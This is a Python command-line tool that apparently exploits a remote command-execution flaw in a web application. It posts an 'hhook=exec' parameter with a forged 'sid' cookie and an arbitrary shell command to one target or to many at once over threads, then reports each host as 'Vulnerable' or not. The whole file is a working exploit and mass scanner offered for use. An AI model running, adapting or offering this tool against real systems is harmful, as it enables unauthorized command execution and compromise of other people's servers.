#!/usr/bin/env python3

import argparse
import requests
import sys
import time
import concurrent.futures
import shlex
import threading

# ANSI color codes for terminal output
GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
BOLD = "\033[1m"
RESET = "\033[0m"

spinner_running = False

# Parse command line options
def parse_options():
    parser = argparse.ArgumentParser(description="")
    parser.add_argument('-f', '--file', dest='file', help='File containing target URLs')
    parser.add_argument('-u', '--url', dest='url', help='Single target URL')
    parser.add_argument('-c', '--cmd', dest='cmd', help='Command to execute', required=False)
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--headers', nargs='+', help='Custom headers in the format: key:value', default=[])
    parser.add_argument('--retry', type=int, default=1, help='Number of retries if a request fails (default: 1)')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    options = parser.parse_args()

    # Check if command (-c) is missing and provide a user-friendly error message
    if not options.cmd:
        print("")
        parser.print_help()
        sys.exit(1)
    
    # Ensure either file or URL is provided
    if not options.file and not options.url:
        print(f"\n{BOLD}{RED}[!] Error: Either a file (-f) or a URL (-u) is required{RESET}\n")
        parser.print_help()
        sys.exit(1)

    return options

# Send POST request and retrieve output
def execute_command(url, cmd, headers=None, retries=1, timeout=10):
    headers = headers or {}
    cmd = ' '.join(shlex.split(cmd))  # Handle complex shell commands
    data = {"sid": "foo", "hhook": "exec", "text": cmd}
    cookies = {"sid": "foo"}

    for attempt in range(retries):
        try:
            response = requests.post(url, data=data, cookies=cookies, headers=headers, timeout=timeout)
            response.raise_for_status()
            return response.text.split('&nbsp;')[1:]
        except requests.exceptions.Timeout:
            return ["Timeout"]
        except requests.RequestException:
            return []

# Check if output indicates vulnerability
def vulnerable(output):
    return any("vulnerable" in line.lower() for line in output)

# Add http/https scheme to a domain if not present
def ensure_http_scheme(target):
    if not target.startswith("http://") and not target.startswith("https://"):
        return "http://" + target  # Default to http, can be adjusted
    return target

# Simple spinner animation
def spinner():
    global spinner_running
    while spinner_running:
        for cursor in "|/-\\":
            sys.stdout.write(f"\r{YELLOW}{cursor} Processing...{RESET}")
            sys.stdout.flush()
            time.sleep(0.1)

# Handle multiple targets concurrently
def handle_multiple_targets(targets, cmd, headers, retries, verbose, threads, timeout):
    global spinner_running
    total_targets = len(targets)

    spinner_running = True
    spinner_thread = threading.Thread(target=spinner)
    spinner_thread.start()

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_target = {executor.submit(execute_command, ensure_http_scheme(target), cmd, headers, retries, timeout): target for target in targets}

        for future in concurrent.futures.as_completed(future_to_target):
            target = future_to_target[future]
            try:
                output = future.result()
                if vulnerable(output):
                    print(f"\r{GREEN}[+] {BOLD}{target} Vulnerable{RESET}")
                elif "Timeout" in output:
                    print(f"\r{RED}[-] {BOLD}{target} Timeout{RESET}")
                else:
                    print(f"\r{RED}[-] {BOLD}{target} Not Vulnerable{RESET}")
            except Exception as exc:
                print(f"{RED}[!] {target} generated an exception: {exc}{RESET}")

    spinner_running = False
    spinner_thread.join()  # Stop the spinner after all tasks are done

    return total_targets

# Main execution flow
options = parse_options()

# Parse custom headers
custom_headers = {}
if options.headers:
    for header in options.headers:
        key, value = header.split(":")
        custom_headers[key.strip()] = value.strip()

# Execute vulnerability check
print(f"\n{BOLD}[+] Starting vulnerability check...{RESET}")

if options.file:
    with open(options.file) as file:
        targets = [line.strip() for line in file if line.strip()]
    handle_multiple_targets(targets, options.cmd, custom_headers, options.retry, options.verbose, options.threads, options.timeout)
elif options.url:
    url = ensure_http_scheme(options.url)
    output = execute_command(url, options.cmd, headers=custom_headers, retries=options.retry, timeout=options.timeout)
    if vulnerable(output):
        print(f"{GREEN}[+] {BOLD}{options.url} Vulnerable{RESET}")
    elif "Timeout" in output:
        print(f"{RED}[-] {BOLD}{options.url} Timeout{RESET}")
    else:
        print(f"{RED}[-] {BOLD}{options.url} Not Vulnerable{RESET}")

sys.exit()  # Exit the script
